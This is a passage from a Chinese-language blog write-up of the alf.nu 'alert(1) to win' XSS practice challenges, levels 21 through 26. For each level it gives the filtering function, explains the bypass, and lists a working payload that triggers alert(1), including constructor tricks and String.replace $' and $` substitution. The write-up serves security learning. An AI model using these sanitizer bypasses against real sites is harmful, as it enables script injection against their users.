+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[][<span class="hljs-string">&quot;m&quot;</span>+(<span class="hljs-number">1</span>+[][<span class="hljs-number">0</span>]+[])[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;p&quot;</span>][<span class="hljs-string">&quot;c&quot;</span>+([][<span class="hljs-string">&quot;m&quot;</span>+(<span class="hljs-number">1</span>+[][<span class="hljs-number">0</span>]+[])[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;p&quot;</span>]+[])[<span class="hljs-number">26</span>]+<span class="hljs-string">&quot;nstr&quot;</span>+([][[]]+[])[<span class="hljs-number">0</span>]+<span class="hljs-string">&quot;ct&quot;</span>+([][<span class="hljs-string">&quot;m&quot;</span>+(<span class="hljs-number">1</span>+[][<span class="hljs-number">0</span>]+[])[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;p&quot;</span>]+[])[<span class="hljs-number">26</span>]+<span class="hljs-string">&quot;r&quot;</span>]((<span class="hljs-number">1</span>+[][<span class="hljs-number">0</span>]+[])[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;l&quot;</span>+([][[]]+[])[<span class="hljs-number">3</span>]+<span class="hljs-string">&quot;rt(1)&quot;</span>)()<br></code></pre></td></tr></table></figure>
+<p>再闭合一下就OK了</p>
+<h3 id="21-3-Payload"><a href="#21-3-Payload" class="headerlink" title="21.3 Payload"></a>21.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;);[][&quot;</span>m<span class="hljs-string">&quot;+(1+[][0]+[])[1]+&quot;</span>p<span class="hljs-string">&quot;][&quot;</span>c<span class="hljs-string">&quot;+([][&quot;</span>m<span class="hljs-string">&quot;+(1+[][0]+[])[1]+&quot;</span>p<span class="hljs-string">&quot;]+[])[26]+&quot;</span>nstr<span class="hljs-string">&quot;+([][[]]+[])[0]+&quot;</span>ct<span class="hljs-string">&quot;+([][&quot;</span>m<span class="hljs-string">&quot;+(1+[][0]+[])[1]+&quot;</span>p<span class="hljs-string">&quot;]+[])[26]+&quot;</span>r<span class="hljs-string">&quot;]((1+[][0]+[])[1]+&quot;</span>l<span class="hljs-string">&quot;+([][[]]+[])[3]+&quot;</span>rt(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;)()//</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190607162658.png" srcset="/img/loading.gif"></p>
+<h2 id="22-Fruit"><a href="#22-Fruit" class="headerlink" title="22. Fruit"></a>22. Fruit</h2><h3 id="22-1-源码"><a href="#22-1-源码" class="headerlink" title="22.1 源码"></a>22.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// CVE-2016-4618</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.implementation.createHTMLDocument().createElement(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    div.innerHTML = s;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;SCRIPT&#x27;</span> === n.tagName) n.parentNode.removeChild(n);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; n.attributes.length; i++) &#123;<br>            <span class="hljs-keyword">var</span> name = n.attributes[i].name;<br>            <span class="hljs-keyword">if</span> (name !== <span class="hljs-string">&#x27;class&#x27;</span>) &#123;<br>                n.removeAttribute(name);<br>            &#125;<br>        &#125;<br>    &#125; [].map.call(div.querySelectorAll(<span class="hljs-string">&#x27;*&#x27;</span>), f);<br>    <span class="hljs-keyword">return</span> div.innerHTML;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="22-2-分析"><a href="#22-2-分析" class="headerlink" title="22.2 分析"></a>22.2 分析</h3><p>题目直接给了提示<code>CVE-2016-4618</code>，但发现没啥用。<br>在这里，代码主要的问题出现在逻辑上，在<code>for</code>循环中，代码通过<code>n.attributes.length</code>来判断边界条件，但是<code>n.attributes.length</code>是动态变化的，如果存在多个属性，则最后一个属性是无法删除的，只要我们构造多个属性即可。</p>
+<h3 id="22-3-Payload"><a href="#22-3-Payload" class="headerlink" title="22.3 Payload"></a>22.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;iframe t onload=alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190609205936.png" srcset="/img/loading.gif"></p>
+<h2 id="23-Fruit-2"><a href="#23-Fruit-2" class="headerlink" title="23. Fruit 2"></a>23. Fruit 2</h2><h3 id="23-1-源码"><a href="#23-1-源码" class="headerlink" title="23.1 源码"></a>23.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// CVE-2016-7650</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.implementation.createHTMLDocument().createElement(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    div.innerHTML = s;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/script/i</span>.test(n.tagName)) n.parentNode.removeChild(n);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; n.attributes.length; i++) &#123;<br>            <span class="hljs-keyword">var</span> name = n.attributes[i].name;<br>            <span class="hljs-keyword">if</span> (name !== <span class="hljs-string">&#x27;class&#x27;</span>) &#123;<br>                n.removeAttribute(name);<br>            &#125;<br>        &#125;<br>    &#125; [].map.call(div.querySelectorAll(<span class="hljs-string">&#x27;*&#x27;</span>), f);<br>    <span class="hljs-keyword">return</span> div.innerHTML;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="23-2-分析"><a href="#23-2-分析" class="headerlink" title="23.2 分析"></a>23.2 分析</h3><p>提示依旧没啥用，而且代码较上一题区别不大，使用同一个<code>Payload</code>即可。</p>
+<h3 id="23-3-Payload"><a href="#23-3-Payload" class="headerlink" title="23.3 Payload"></a>23.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;iframe t onload=alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190609210305.png" srcset="/img/loading.gif"></p>
+<h2 id="24-Capitals"><a href="#24-Capitals" class="headerlink" title="24. Capitals"></a>24. Capitals</h2><h3 id="24-1-源码"><a href="#24-1-源码" class="headerlink" title="24.1 源码"></a>24.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// submitted by msamuel</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> capitals = &#123;<br>        <span class="hljs-string">&quot;CA&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;AB&quot;</span>: <span class="hljs-string">&quot;Edmonton&quot;</span>,<br>            <span class="hljs-string">&quot;BC&quot;</span>: <span class="hljs-string">&quot;Victoria&quot;</span>,<br>            <span class="hljs-string">&quot;MB&quot;</span>: <span class="hljs-string">&quot;Winnipeg&quot;</span>,<br>            <span class="hljs-comment">// etc.</span><br>        &#125;,<br>        <span class="hljs-string">&quot;US&quot;</span>: &#123;<br>            <span class="hljs-comment">// Alabama changed its state capital.</span><br>            <span class="hljs-string">&quot;AL&quot;</span>: ((year) = &gt;year &lt; <span class="hljs-number">1846</span> ? <span class="hljs-string">&quot;Tuscaloosa&quot;</span>: <span class="hljs-string">&quot;Montgomery&quot;</span>),<br>            <span class="hljs-string">&quot;AK&quot;</span>: <span class="hljs-string">&quot;Juneau&quot;</span>,<br>            <span class="hljs-string">&quot;AR&quot;</span>: <span class="hljs-string">&quot;Phoenix&quot;</span>,<br>            <span class="hljs-comment">// etc.</span><br>        &#125;,<br>    &#125;;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">capitalOf</span>(<span class="hljs-params">country, stateOrProvinceName, year</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> capital = capitals[country][stateOrProvinceName];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> capital === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>            capital = capital(year);<br>        &#125;<br>        <span class="hljs-keyword">return</span> capital<br>    &#125;<br><br>    <span class="hljs-keyword">var</span> inputs = (s || <span class="hljs-string">&quot;&quot;</span>).split(<span class="hljs-regexp">/#/g</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;b&gt;&#x27;</span> + capitalOf(inputs[<span class="hljs-number">0</span>], inputs[<span class="hljs-number">1</span>], inputs[<span class="hljs-number">2</span>]) + <span class="hljs-string">&#x27;&lt;/b&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="24-2-分析"><a href="#24-2-分析" class="headerlink" title="24.2 分析"></a>24.2 分析</h3><p>代码的逻辑很简单，我们要想执行<code>alert(1)</code>，需要满足<code>if (typeof capital === &#39;function&#39;)</code>，而<code>var capital = capitals[country][stateOrProvinceName];</code>，这里想到了我们前面做题用到的匿名函数。</p>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190609211136.png" srcset="/img/loading.gif"></p>
+<p>然后我们再用<code>&lt;/b&gt;</code>闭合<code>b</code>标签，添加<code>&lt;script&gt;</code>标签来执行<code>alert(1)</code>。</p>
+<h3 id="24-3-Payload"><a href="#24-3-Payload" class="headerlink" title="24.3 Payload"></a>24.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">CA#<span class="hljs-title">constructor</span>#&lt;/<span class="hljs-title">b</span>&gt;&lt;<span class="hljs-title">script</span>&gt;<span class="hljs-title">alert</span>(<span class="hljs-params"><span class="hljs-number">1</span></span>)&lt;/<span class="hljs-title">script</span>&gt;<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190609100344.png" srcset="/img/loading.gif"></p>
+<h2 id="25-Entities"><a href="#25-Entities" class="headerlink" title="25. Entities"></a>25. Entities</h2><h3 id="25-1-源码"><a href="#25-1-源码" class="headerlink" title="25.1 源码"></a>25.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// submitted by securityMB</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">htmlentities</span>(<span class="hljs-params">s</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> s.replace(<span class="hljs-regexp">/[&amp;&lt;&gt;&quot;&#x27;]/g</span>, c = &gt;<span class="hljs-string">` &amp; #$ &#123;</span><br><span class="hljs-string">            c.charCodeAt(0)</span><br><span class="hljs-string">        &#125;;`</span>)<br>    &#125;<br>    s = htmlentities(s);<br>    <span class="hljs-keyword">return</span><span class="hljs-string">` &lt; script &gt;</span><br><span class="hljs-string">    var obj = &#123;&#125;;</span><br><span class="hljs-string">    obj[&quot;<span class="hljs-subst">$&#123;s&#125;</span>&quot;] = &quot;<span class="hljs-subst">$&#123;s&#125;</span>&quot;; &lt; /script&gt;`</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="25-2-分析"><a href="#25-2-分析" class="headerlink" title="25.2 分析"></a>25.2 分析</h3><p>代码对<code>&amp;</code>、<code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code>、<code>&#39;</code>进行了转义，后面返回值部分存在两个拼接点。借助转义符<code>\</code>和注释符来进行绕过，拼接代码执行。</p>
+<h3 id="25-3-Payload"><a href="#25-3-Payload" class="headerlink" title="25.3 Payload"></a>25.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">];alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//\</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190607220233.png" srcset="/img/loading.gif"></p>
+<h2 id="26-level"><a href="#26-level" class="headerlink" title="26. %level%"></a>26. %level%</h2><h3 id="26-1-源码"><a href="#26-1-源码" class="headerlink" title="26.1 源码"></a>26.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// submitted anonymously</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">const</span> userInput = <span class="hljs-built_in">JSON</span>.stringify(s).replace(<span class="hljs-regexp">/[&lt;]/g</span>, <span class="hljs-string">&#x27;%lt&#x27;</span>).replace(<span class="hljs-regexp">/[&gt;]/g</span>, <span class="hljs-string">&#x27;%gt&#x27;</span>);<br>    <span class="hljs-keyword">const</span> userTemplate = <span class="hljs-string">&#x27;&lt;script&gt;let some = %userData%&lt;/script&gt;&#x27;</span>;<br>    <span class="hljs-keyword">return</span> userTemplate.replace(<span class="hljs-regexp">/%userData%/</span>, userInput);<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="26-2-分析"><a href="#26-2-分析" class="headerlink" title="26.2 分析"></a>26.2 分析</h3><p>代码对输入的字符串使用<code>JSON.stringify</code>进行了处理，然后对<code>&lt;</code>和<code>&gt;</code>进行了编码。<br>在<code>replace</code>中，<code>userInput</code>是可控的，在这里用到了关于<code>String​.prototype​.replace()</code>的一个小<code>trick</code>。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace</a></p>
+</blockquote>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190609211849.png" srcset="/img/loading.gif"></p>
+<p>我们可以通过<code>$&#39;</code>来引入匹配的子串右边的内容<code>&lt;/script&gt;</code>来闭合开头的<code>&lt;script&gt;</code>，然后使用<code>$\</code>来引入匹配的子串左边的内容<code>&lt;script&gt;let some = </code>，这样就没有双引号来干扰了，直接使用调用<code>alert(1)</code>，然后注释掉后面的代码即可。</p>
+<h3 id="26-3-Payload"><a href="#26-3-Payload" class="headerlink" title="26.3 Payload"></a>26.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$<span class="hljs-string">&#x27;$`alert(1)//</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190609212959.png" srcset="/img/loading.gif"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
+<li> <a target="_blank" rel="noopener" href="https://cxliker.github.io/2018/01/29/XSS%E7%BB%83%E4%B9%A0-alf-nu-alert1-Write-ups/">https://cxliker.github.io/2018/01/29/XSS%E7%BB%83%E4%B9%A0-alf-nu-alert1-Write-ups/</a></li>
+<li> <a target="_blank" rel="noopener" href="https://github.com/masazumi-github/alert-1-to-win#a028">https://github.com/masazumi-github/alert-1-to-win#a028</a></li>
+<li> <a target="_blank" rel="noopener" href="http://juniorprincewang.github.io/2018/10/14/alf-nu-alert1%E6%80%BB%E7%BB%93/">http://juniorprincewang.github.io/2018/10/14/alf-nu-alert1%E6%80%BB%E7%BB%93/</a></li>
+</ol>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Writeup/">Writeup</a>
+                    
+                      <a class="hover-with-bg" href="/tags/XSS/">XSS</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/06/20/php-trick-weak-type/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP黑魔法深度剖析（一）——PHP的弱类型比较</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/06/04/prompt1_to_win/">
+                        <span class="hidden-mobile">XSS靶场练习（一）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
